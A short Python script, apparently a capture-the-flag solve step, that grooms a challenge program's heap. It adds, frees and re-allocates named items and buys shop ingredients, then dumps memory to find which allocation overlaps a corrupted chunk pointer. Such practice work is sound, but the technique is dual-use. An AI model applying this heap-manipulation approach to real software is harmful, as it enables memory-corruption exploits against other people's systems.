import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
g.add(b'A1'); g.add(b'B2'); g.make(b'b1'); g.add(b'YY'); g.add(b'Z9'); g.make(b'b3')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')   # CC->next=&YY (0x120), remainder 0x90
# buy 4 new shop ingredients (Apple4,Salt6,Pork7,Scallion8) -> new foods
g.buy(b'4', b'1')  # Apple
g.buy(b'6', b'1')  # Salt
g.buy(b'7', b'1')  # Pork
g.buy(b'8', b'1')  # Scallion
g.dump('after 4 buys (find which lands at YY = CC->next)')
g.close()
